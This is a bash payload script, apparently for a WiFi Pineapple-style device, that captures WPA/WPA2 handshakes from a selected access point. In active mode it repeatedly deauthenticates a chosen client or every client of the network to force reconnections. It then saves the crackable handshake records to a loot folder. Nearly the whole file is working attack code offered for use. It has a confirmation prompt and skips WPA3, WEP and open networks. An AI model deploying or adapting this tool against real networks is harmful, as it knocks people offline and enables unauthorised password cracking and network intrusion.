#!/bin/bash

# Title: SCALPEL - Surgical Handshake Capture
# Description: Capture a WPA/WPA2 handshake for the selected access point by locking
#              the recon engine to its channel and (optionally) deauthenticating a
#              client. Works as both an AP payload and a client payload.
# Author: sinXne0
# Version: 1.1
# Category: Recon
#
# Options (set below):
#   SCALPEL_MODE             passive | active | auto
#   SCALPEL_TARGET_CLIENT    single MAC, or empty = all clients of the BSSID
#   SCALPEL_TIMEOUT          active: overall seconds cap
#   SCALPEL_PASSIVE_TIMEOUT  passive: how long to wait for a natural reconnect
#   SCALPEL_DEAUTH_INTERVAL  seconds between deauth bursts / checks
#   SCALPEL_MAX_DEAUTH       max deauth bursts before giving up
#
# LED State Descriptions
#   Blue   - capturing
#   Green  - handshake captured
#   Red    - failed / cancelled

# ---- Options -------------------------------------------------------------
SCALPEL_MODE="auto"
SCALPEL_TARGET_CLIENT=""
SCALPEL_TIMEOUT=120
SCALPEL_PASSIVE_TIMEOUT=360
SCALPEL_DEAUTH_INTERVAL=6
SCALPEL_MAX_DEAUTH=10
SCALPEL_LOOT="/root/loot/handshakes"

# ---- Recon environment (injected when run against a selected device) -----
SSID="${_RECON_SELECTED_AP_SSID}"
BSSID="${_RECON_SELECTED_AP_BSSID:-${_RECON_SELECTED_AP_MAC_ADDRESS}}"
CHANNEL="${_RECON_SELECTED_AP_CHANNEL}"
ENC="${_RECON_SELECTED_AP_ENCRYPTION_TYPE}"
CLIENT_COUNT="${_RECON_SELECTED_AP_CLIENT_COUNT:-${_RECON_SELECTED_AP_CLIENTS:-0}}"
# Set when run as a *client* payload: the exact client to surgically deauth.
SELECTED_CLIENT="${_RECON_SELECTED_CLIENT_MAC_ADDRESS:-${_RECON_SELECTED_CLIENT_MAC:-}}"

# ---- Helpers -------------------------------------------------------------
bssid_hex() { echo "$1" | tr -d ':' | tr 'a-f' 'A-F'; }

is_num() { case "$1" in ''|*[!0-9]*) return 1;; *) return 0;; esac; }

# Return the first loot file containing a full-handshake (MIC) record for
# this BSSID. The hccapx/22000 line embeds the AP MAC: WPA*01*MIC*<apmac>*...
find_handshake() {
  local f
  for f in "$SCALPEL_LOOT"/*.22000 "$SCALPEL_LOOT"/*.hccapx; do
    [ -f "$f" ] || continue
    grep -qE "^WPA\*01\*MIC\*$(bssid_hex "$BSSID")\*" "$f" 2>/dev/null && { echo "$f"; return 0; }
  done
  return 1
}

# ---- Banner --------------------------------------------------------------
print_art() {
  LOG green "    +---------------------------+"
  LOG green "    |      HACK THE PLANET      |"
  LOG green "    +---------------------------+"
  LOG "           .-~~~~~~-."
  LOG "        .-'   *   *   '-."
  LOG "       /    *   *   *    \\"
  LOG "      |   *   *   *   *   |"
  LOG "       \\    *   *   *    /"
  LOG "        '-.   *   *   .-'"
  LOG "           '-~~~~~~-'"
  LOG ""
}

# ---- Validate inputs ------------------------------------------------------
if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
  ERROR_DIALOG "Missing target data"
  exit 0
fi

# Only WPA/WPA2-PSK networks produce a crackable handshake.
ENC_UP=$(echo "$ENC" | tr 'a-z' 'A-Z')
case "$ENC_UP" in
  *WPA3*|*SAE*|*OWE*) ERROR_DIALOG "No crackable handshake ($ENC)"; exit 0;;
  *WEP*)              ERROR_DIALOG "WEP network ($ENC)"; exit 0;;
  *OPEN*|*NONE*|"")   ERROR_DIALOG "Open network ($ENC)"; exit 0;;
esac

# ---- Authorization gate ---------------------------------------------------
resp=$(CONFIRMATION_DIALOG "Capture handshake for '$SSID'?")
if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
  LOG "Cancelled"
  exit 0
fi

# ---- Mode -----------------------------------------------------------------
case "$SCALPEL_MODE" in
  active|passive) ;;
  *)
    if is_num "$CLIENT_COUNT" && [ "$CLIENT_COUNT" -gt 0 ]; then
      LOG "Clients observed: $CLIENT_COUNT"
    else
      LOG yellow "No clients observed; Active mode deauths all clients of this BSSID."
    fi
    # Always offer both modes. LIST_PICKER requires firmware 1.0.8+; fall
    # back to active on failure.
    SCALPEL_MODE=$(LIST_PICKER "Capture mode" "Active (deauth)" "Passive (wait)" 2>/dev/null) \
      || SCALPEL_MODE="Active (deauth)"
    case "$SCALPEL_MODE" in
      *Active*) SCALPEL_MODE="active" ;;
      *) SCALPEL_MODE="passive" ;;
    esac
    ;;
esac

# Deauth target: exact client if known, else all clients of the BSSID.
if [ "$SCALPEL_MODE" = "active" ]; then
  if [ -n "$SELECTED_CLIENT" ]; then
    SCALPEL_TARGET_CLIENT="$SELECTED_CLIENT"
  elif [ -z "$SCALPEL_TARGET_CLIENT" ]; then
    SCALPEL_TARGET_CLIENT=$(MAC_PICKER "Deauth target (FF:...=all)" "FF:FF:FF:FF:FF:FF") || exit 0
  fi
fi

# ---- Short-circuit: already have it? -------------------------------------
EXISTING=$(find_handshake)
if [ -n "$EXISTING" ]; then
  ALERT "Handshake already captured"
  LOG green "Existing: $EXISTING"
  exit 0
fi

# ---- Banner + target info -------------------------------------------------
print_art
LOG blue "Target: $SSID ($BSSID)"
LOG "Channel $CHANNEL | Mode: $SCALPEL_MODE"

# ---- Capture --------------------------------------------------------------
touch /tmp/scalpel_marker

# Lock the recon engine to the AP's channel (auto-release after the timeout).
[ "$SCALPEL_MODE" = "active" ] && LOCK="$SCALPEL_TIMEOUT" || LOCK="$SCALPEL_PASSIVE_TIMEOUT"
PINEAPPLE_EXAMINE_BSSID "$BSSID" "$LOCK"
PCAP=$(WIFI_PCAP_START)

if [ "$SCALPEL_MODE" = "passive" ]; then
  LOG yellow "Waiting for a client to (re)connect..."
  LOG yellow "WPA sessions refresh ~every 5 min. Be patient."
fi

FOUND=""
START_TS=$(date +%s)
burst=0

while : ; do
  if [ "$SCALPEL_MODE" = "active" ]; then
    if [ "$burst" -ge "$SCALPEL_MAX_DEAUTH" ]; then
      break
    fi
    burst=$((burst + 1))
    DEAUTH_CLIENT "$BSSID" "$SCALPEL_TARGET_CLIENT" "$CHANNEL"
    LOG yellow "deauth burst $burst/$SCALPEL_MAX_DEAUTH"
  fi

  sleep "$SCALPEL_DEAUTH_INTERVAL"

  # Look for a *new* full-handshake record for this BSSID.
  for f in $(find "$SCALPEL_LOOT" -type f \( -name '*.22000' -o -name '*.hccapx' \) \
             -newer /tmp/scalpel_marker 2>/dev/null); do
    if grep -qE "^WPA\*01\*MIC\*$(bssid_hex "$BSSID")\*" "$f" 2>/dev/null; then
      FOUND="$f"
      break 2
    fi
  done

  [ $(( $(date +%s) - START_TS )) -ge "$LOCK" ] && break
done

WIFI_PCAP_STOP
PINEAPPLE_EXAMINE_RESET

# ---- Report ---------------------------------------------------------------
if [ -n "$FOUND" ]; then
  ALERT "Handshake captured"
  LOG green "Handshake: $FOUND"
  LOG "Raw pcap:  $PCAP"
  exit 0
fi

ALERT "No handshake captured"
if [ "$SCALPEL_MODE" = "passive" ]; then
  LOG red "No reconnect during the wait. Try Active mode."
else
  LOG red "No handshake for $SSID ($BSSID). Client may ignore deauth."
fi
exit 0
